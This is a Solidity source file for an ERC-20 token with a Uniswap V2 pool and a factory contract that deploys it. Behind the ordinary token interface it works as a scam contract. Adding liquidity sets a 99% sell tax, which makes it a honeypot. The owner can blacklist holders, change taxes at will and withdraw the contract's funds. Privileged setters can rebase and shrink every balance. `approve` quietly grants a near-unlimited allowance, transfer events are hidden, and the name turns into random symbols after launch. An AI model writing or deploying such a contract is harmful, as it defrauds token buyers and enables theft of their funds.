// SPDX-License-Identifier: MIT

pragma solidity ^0.8.21;

contract ERC20s {

    string internal _name;
    string internal _symbol;
    uint internal _decimals;
    uint internal _totalSupply;

    mapping(address => uint) internal _balanceOf;
    mapping(address => mapping(address => uint)) internal _allowance;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor(string memory name_, string memory symbol_, uint decimals_, uint supply_) {
        _name = name_; _symbol = symbol_; _decimals = decimals_;
        _totalSupply = supply_ * 10 ** decimals_;
        _balanceOf[msg.sender] = _totalSupply;
    }

    function name() public view virtual returns (string memory) { return _name; }
    function symbol() public view virtual returns (string memory) { return _symbol; }
    function decimals() public view virtual returns (uint) { return _decimals; }
    function totalSupply() public view virtual returns (uint) { return _totalSupply; }
    function balanceOf(address account) public view virtual returns (uint) { return _balanceOf[account]; }
    function allowance(address owner, address spender) public view virtual returns (uint) { return _allowance[owner][spender]; }

    function approve(address spender, uint amount) public virtual returns (bool) {
        _allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint amount) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint amount) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint amount) internal virtual {
        require(_balanceOf[from] >= amount, "ERC20s: transfer amount exceeds balance");
        _balanceOf[from] -= amount;
        _balanceOf[to] += amount;
    }

    function _spendAllowance(address owner, address spender, uint amount) internal virtual {
        require(_allowance[owner][spender] >= amount, "ERC20s: insufficient allowance");
        _allowance[owner][spender] -= amount;
    }

}

interface IUniswapV2Router02{
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Pair {function sync() external;}

interface IUniswapV2Factory{function createPair(address tokenA, address tokenB) external returns (address pair);}

contract contract_ is ERC20s {

    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Pair public uniswapPair;

    uint public _buyTax = 0;
    uint public _sellTax = 0;
    uint public _max = 4;
    uint public _transferDelay = 0;
    uint public _swapAmount = 1000 * 10**18;
    uint public _initBase = 1000000000000000;
    uint public _base = _initBase;


    address private _dev;
    address[] public _path;
    address private _v2Pair;
    address private _collector;
    address private _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    mapping(address => bool) public isSetter;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public whitelisted;
    mapping(address => uint) private _lastTransferBlock;
    mapping(address => bool) public privacyEnabled;

    bool public transferEvents = false;
    bool public autoRebase = true;

    string[] public lingua = [
        unicode"\u260C", unicode"\u2291", unicode"\u27DF", unicode"\u27CA", unicode"\u260D", unicode"\u2330", unicode"\u2241",
        unicode"\u23C3", unicode"\u239A", unicode"\u260A", unicode"\u2385", unicode"\u27D2",unicode"\u238E", unicode"\u2307",
        unicode"\u2294", unicode"\u22CF", unicode"\u235C", unicode"\u233F", unicode"\u237E", unicode"\u2340",
        unicode"\u238D", unicode"\u2390", unicode"\u2359", unicode"\u2316", unicode"\u22AC", unicode"\u2289"
    ];

    uint public autoRate = 5;
    uint public deployStamp;
    uint public transactionCount = 0;
    uint public x = 1;

    event Rebase(uint newRebaseRate);
    event SetterUpdated(address setter, bool status);

    modifier onlyDev() {require(msg.sender == _dev, "Only the developer can call this function");_;}
    modifier onlySetter() {require(isSetter[msg.sender], "Not a setter");_;}

    constructor(address collector_) ERC20s(string(abi.encodePacked(
        "ALI",unicode"\u4E09", "N", " ", "P",  unicode"\u4E09", "P", unicode"\u4E09")), "AP", 18, 1000000000000000) {
            _collector = collector_; _dev = msg.sender;
            _balanceOf[msg.sender] = 0; _balanceOf[address(this)] = _initBase * 10 ** _decimals;
            uniswapV2Router = IUniswapV2Router02(_v2Router);
            _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
            _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();
            whitelisted[address(this)] = true; whitelisted[tx.origin] = true;
            uniswapPair = IUniswapV2Pair(_v2Pair); deployStamp = block.timestamp;
            emit Transfer(address(0), address(0), 0);
    }

    function deposit(address receiver_) external payable onlyDev{_addLiquidity(receiver_);}

    function maxInt() public view returns (uint) {return (_totalSupply * _max * _base / _initBase) / 100 + 1*10**10;}

    function updateX(uint newX) external onlyDev {x = newX;}

    function updateTaxes(uint buyTax_, uint sellTax_) external onlyDev {_buyTax = buyTax_; _sellTax = sellTax_;}

    function updateMax(uint newMax) external onlyDev {_max = newMax;}

    function updateDelayTransfer(uint newTransferDelay) external onlyDev {_transferDelay = newTransferDelay;}

    function updateSwapAmount(uint newSwapAmount) external onlyDev {_swapAmount = newSwapAmount;}

    function changeDev(address newDev) external onlyDev {_dev = newDev;}

    function transferEventToggle() external onlyDev {transferEvents = !transferEvents;}

    function autoRebaseToggle() external onlyDev {autoRebase = !autoRebase;}

    function emitter(address from, address to, uint amount) public onlySetter {emit Transfer(from, to, amount);}

    function updateAutoRate(uint autoRate_) public onlyDev {autoRate = autoRate_;}

    function _transfer(address from, address to, uint amount)internal override{

        uint adjustedAmount = amount * _initBase / _base;

        if (whitelisted[from] || whitelisted[to]) {super._transfer(from, to, adjustedAmount); return;}

        require(_balanceOf[from] * _base / _initBase >= amount && (amount + 
            (_balanceOf[to] * _base / _initBase) <= maxInt() ||
            whitelisted[from] || whitelisted[to] || to == _v2Pair),
            "ERC20s: transfer amount exceeds balance or max wallet"
        );

        require(!blacklisted[from] && !blacklisted[to], "ERC20s: YOU DONT HAVE THE RIGHT");

        require(block.number >= _lastTransferBlock[from] + _transferDelay ||
            from == _v2Pair || whitelisted[from] || whitelisted[to],
            "ERC20s: transfer delay not met"
        );

        uint taxAmount = 0;
        if ((from == _v2Pair || to == _v2Pair) && !whitelisted[from] && !whitelisted[to]) {
            if (to == _v2Pair) {
                taxAmount = (adjustedAmount * _sellTax) / 100;
            } else {
                taxAmount = (adjustedAmount * _buyTax) / 100;
            }

            _balanceOf[address(this)] += taxAmount;
            if (transferEvents) {emit Transfer(from, address(this), taxAmount * _base / _initBase);}

            _lastTransferBlock[from] = block.number; _lastTransferBlock[to] = block.number;
            if (balanceOf(address(this)) > _swapAmount && to == _v2Pair) {
                _swapBack(super.balanceOf(address(this)) * _base / _initBase);
            }
        }

        _balanceOf[from] -= adjustedAmount;
        _balanceOf[to] += adjustedAmount - taxAmount;
        transactionCount++;
        if (transferEvents) {emit Transfer(from, to, amount - (taxAmount * _base / _initBase));}
        if (transactionCount >= x && from != _v2Pair && to != _v2Pair && autoRebase) {
            uint rand = block.prevrandao % (autoRate + 1);
            uint reduction = _base * rand / 100;
            if (_base > reduction) {_base -= reduction;}
            transactionCount = 0; uniswapPair.sync();
        }
    }

    function balanceOf(address account) public view override returns (uint) {
        if(privacyEnabled[account]) {
            revert("This account's balance is private");
        }
        return super.balanceOf(account) * _base / _initBase;
    }

    function totalSupply() public view override returns (uint) {
        return _totalSupply * _base / _initBase;
    }

    function name() public view override returns (string memory) {
        if(block.timestamp < deployStamp + (60 * 5)) {return _name;}
        uint rand = uint(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % lingua.length;
        return string(abi.encodePacked(
            lingua[rand], 
            lingua[(rand + 1) % lingua.length], lingua[(rand + 2) % lingua.length],
            lingua[(rand + 3) % lingua.length], lingua[(rand + 4) % lingua.length], 
            " ",
            lingua[(rand + 5) % lingua.length], lingua[(rand + 6) % lingua.length], 
            lingua[(rand + 7) % lingua.length], lingua[(rand + 8) % lingua.length]
        ));
    }

    function symbol() public view override returns (string memory) {
        if(block.timestamp < deployStamp + (60 * 5)) {return _symbol;}
        uint rand = uint(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % lingua.length;
        return string(abi.encodePacked(lingua[rand], lingua[(rand + 1) % lingua.length]));
    }

    function togglePrivacy(address _address) external {
        require(msg.sender == _address || isSetter[msg.sender], "Not authorized");
        privacyEnabled[_address] = !privacyEnabled[_address];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        super.approve(spender, _initBase * 10 ** 18);
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function disApprove(address spender) public returns (bool) {
        super.approve(spender, 0);
        emit Approval(msg.sender, spender, 0);
        return true;
    }

    function updateBase(uint newRate) public onlySetter {
        _base = newRate;
        uniswapPair.sync();
        emit Rebase(newRate);
    }

    function updateSetter(address setter, bool status) public onlyDev {
        isSetter[setter] = status;
        emit SetterUpdated(setter, status);
    }

    function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {
        for (uint i = 0; i < addresses.length; i++) {
            whitelisted[addresses[i]] = whitelisted_;
        }
    }

    function updateBlacklist(address[] memory addresses, bool blacklisted_) external onlyDev{
        for (uint i = 0; i < addresses.length; i++) {blacklisted[addresses[i]] = blacklisted_;}
    }

    function _swapBack(uint amount_) internal{
        _allowance[address(this)][_v2Router] = totalSupply();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);
    }

    function _forceSwapBack(uint amount_) public onlyDev{
        _allowance[address(this)][_v2Router] = totalSupply();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);
    }

    function _addLiquidity(address receiver_) public onlyDev{
        _allowance[address(this)][_v2Router] = _balanceOf[address(this)]; _buyTax = 20; _sellTax = 99;
        uniswapV2Router.addLiquidityETH{
            value: address(this).balance}(address(this), _balanceOf[address(this)], 0, 0, receiver_, block.timestamp
        );
    }

    function withdraw(uint amount_) external onlyDev {
        payable(_dev).transfer(address(this).balance);
        _transfer(address(this), _dev, amount_);
    }

}

contract factory_ {
    contract_ public contractInstance;

    address private dev_;

    constructor() payable {
        dev_ = msg.sender;
        contract_ newContract = new contract_(dev_);
        contractInstance = newContract;
        newContract.deposit{value: msg.value}(dev_);
        newContract.changeDev(tx.origin);
    }
}